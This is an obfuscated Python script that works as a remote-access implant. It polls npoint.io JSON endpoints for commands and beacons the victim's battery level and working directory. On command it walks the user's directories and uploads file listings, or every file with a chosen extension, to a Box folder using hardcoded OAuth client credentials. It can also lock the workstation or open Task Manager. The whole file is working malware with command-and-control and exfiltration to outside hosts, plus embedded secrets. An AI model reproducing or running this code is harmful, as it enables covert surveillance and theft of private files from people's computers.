import pyautogui ,ctypes ,psutil ,os #line:1
import time ,requests ,json ,datetime #line:2
from boxsdk import OAuth2 ,Client #line:4
def li (O0OOOOOO0O0000000 ,O0OO0O0O00O000O0O ):#line:6
    OO000O0OOOOOO0000 ="."+O0OO0O0O00O000O0O #line:7
    O00O0OO00O0OOO0OO =[]#line:8
    for OOOOOOOOOOOO00OO0 ,O0OOO00O0O0OOOO0O ,O0O00O00O00O0000O in os .walk (O0OOOOOO0O0000000 ):#line:10
        for OOO000OOOOOO00OOO in O0O00O00O00O0000O :#line:11
            if OO000O0OOOOOO0000 in OOO000OOOOOO00OOO :#line:12
                OO0O0O0O00000O00O =os .path .join (OOOOOOOOOOOO00OO0 ,OOO000OOOOOO00OOO )#line:13
                O00O0OO00O0OOO0OO .append (OO0O0O0O00000O00O )#line:14
    return O00O0OO00O0OOO0OO #line:15
def lia (OO00000O00O00OO00 ,O0OO00OOO00OOOOO0 ):#line:17
    OOOO000OO00OO0O00 =[]#line:18
    OOOOOOO000O0OO0OO =os .path .join (os .path .join (os .environ ['USERPROFILE']),'Documents','Tree-'+str (datetime .datetime .now ()).replace (":","-")+'.db')#line:19
    print (OOOOOOO000O0OO0OO )#line:20
    for OOOO0000OOOOO0OO0 ,OOO0OOOOOO0000OO0 ,OO00OO0OO00000000 in os .walk (OO00000O00O00OO00 ):#line:21
        for OO00OOO000OO0O00O in OO00OO0OO00000000 :#line:22
            O00OOO0OOOOOOOO00 =os .path .join (OOOO0000OOOOO0OO0 ,OO00OOO000OO0O00O )#line:23
            OOOO000OO00OO0O00 .append (O00OOO0OOOOOOOO00 )#line:24
    for OOO0OO0OO00000O0O in OOOO000OO00OO0O00 :#line:25
        with open (OOOOOOO000O0OO0OO ,"a",encoding ="utf-8")as O0OO0OOO0OOOO000O :#line:26
            O0OO0OOO0OOOO000O .write (OOO0OO0OO00000O0O .replace ("\\","/")+"\n")#line:27
        O0OO0OOO0OOOO000O .close ()#line:28
    upload (OOOOOOO000O0OO0OO ,O0OO00OOO00OOOOO0 )#line:29
    os .remove (OOOOOOO000O0OO0OO )#line:30
    return True #line:31
def upload (OO00O0O0000OO0OO0 ,O0O0O0O0O0O0OOOO0 ):#line:33
        O0OOO0000OO0OO0O0 ='152448042033'#line:34
        try :#line:35
            O0O00O0OO00O0000O =OAuth2 (client_id ='q7xyfden1kqr1njwmthmrlhm2maj9imj',client_secret ='T7afVolugPHyGv0VEfr6oSpIluZai9GJ',access_token =O0O0O0O0O0O0OOOO0 ,)#line:40
            O0000OO00O000OO0O =Client (O0O00O0OO00O0000O )#line:41
            O0O00O000O000O000 =O0000OO00O000OO0O .user ().get ()#line:42
        except :#line:43
            print ("ERROR")#line:44
        OO00000OO0OO0O000 =O0000OO00O000OO0O .folder (O0OOO0000OO0OO0O0 ).upload (OO00O0O0000OO0OO0 )#line:46
def exim (OO0OOO0OO0OO0O0O0 ,O0O00OOOOOO0O0000 ,OOOO000OO0OO00O0O ):#line:48
    O00O000O00O0O0OO0 =li (OO0OOO0OO0OO0O0O0 ,O0O00OOOOOO0O0000 )#line:49
    for OOO0O00OO0OO0000O in O00O000O00O0O0OO0 :#line:50
        upload (OOO0O00OO0OO0000O ,OOOO000OO0OO00O0O )#line:51
clist =["X"]#line:61
def reset ():#line:63
    OO000OOOO00OO0000 ="https://api.npoint.io/64e7e6570c214cf1b6b5"#line:64
    O0OOO0O0O0OO00OOO ={"cmd":"0"}#line:65
    O0O0O0000OO0OO000 =requests .post (OO000OOOO00OO0000 ,json =O0OOO0O0O0OO00OOO )#line:66
    O0O0OO0O00O0OOO0O =requests .get (OO000OOOO00OO0000 )#line:67
    print (O0O0OO0O00O0OOO0O .status_code )#line:68
def battery ():#line:70
    OOOO0OO0O00O000OO =psutil .sensors_battery ()#line:71
    return OOOO0OO0O00O000OO .percent #line:72
def status ():#line:74
    O0000000OO0O0O0O0 ="https://api.npoint.io/447e7092e04037af030b"#line:75
    O0OO00O0O00OO00O0 =requests .get (O0000000OO0O0O0O0 )#line:76
    O00OO0OO0OOO00O0O =str (int (datetime .datetime .utcnow ().timestamp ())+19800 )#line:78
    O00O00OO00OO0O0OO ={"date":O00OO0OO0OOO00O0O ,"battery":battery (),"pwd":os .path .abspath (os .getcwd ())}#line:79
    OOO0000OOOOOO0OO0 =requests .post (O0000000OO0O0O0O0 ,json =O00O00OO00OO0O0OO )#line:80
def run (O00O0OO0OO0O00O0O ):#line:83
    O00OOOOOO00OO0OOO =O00O0OO0OO0O00O0O .split ("$#")#line:84
    OOOOO0O000OO00OOO =O00OOOOOO00OO0OOO [1 ]#line:85
    if OOOOO0O000OO00OOO =="lia":#line:86
        OO000O00O0OOOO000 =O00OOOOOO00OO0OOO [2 ]#line:87
        OO000OOO0O0OOOOO0 =O00OOOOOO00OO0OOO [3 ]#line:88
        lia (OO000O00O0OOOO000 ,OO000OOO0O0OOOOO0 )#line:89
    elif OOOOO0O000OO00OOO =="exim":#line:92
        OO000O00O0OOOO000 =O00OOOOOO00OO0OOO [2 ]#line:93
        OO000OOO0O0OOOOO0 =O00OOOOOO00OO0OOO [3 ]#line:94
        O0OOO000O0OO0OOOO =O00OOOOOO00OO0OOO [4 ]#line:95
        exim (OO000O00O0OOOO000 ,O0OOO000O0OO0OOOO ,OO000OOO0O0OOOOO0 )#line:96
    elif OOOOO0O000OO00OOO =="upload":#line:99
        OO0O00O0OOOOOOOO0 =O00OOOOOO00OO0OOO [2 ]#line:100
        OO000OOO0O0OOOOO0 =O00OOOOOO00OO0OOO [3 ]#line:101
        upload (OO0O00O0OOOOOOOO0 ,OO000OOO0O0OOOOO0 )#line:102
    else :#line:105
        print (O00OOOOOO00OO0OOO )#line:106
def Command (O00000OO00O0000OO ):#line:108
    if O00000OO00O0000OO =="1":#line:109
        pyautogui .hotkey ('ctrl','shift','esc')#line:110
    elif O00000OO00O0000OO =="2":#line:112
        pyautogui .alert (text ='Hello World!',title ='Hello',button ='OK')#line:113
    elif O00000OO00O0000OO =="3":#line:114
        ctypes .windll .user32 .LockWorkStation ()#line:115
    else :#line:117
        if O00000OO00O0000OO [:1 ]=="R":#line:118
            try :#line:119
                run (O00000OO00O0000OO )#line:120
            except :#line:121
                print ("COMMAND ERROR")#line:122
        else :#line:123
            print ("Command-",O00000OO00O0000OO )#line:124
while True :#line:126
    response =requests .get ('https://api.npoint.io/64e7e6570c214cf1b6b5').json ()#line:127
    cmd =response ['cmd']#line:128
    status ()#line:129
    if cmd not in clist :#line:130
        clist .append (cmd )#line:131
        clist .pop (0 )#line:132
        print (cmd )#line:133
        Command (cmd )#line:134
        reset ()#line:135
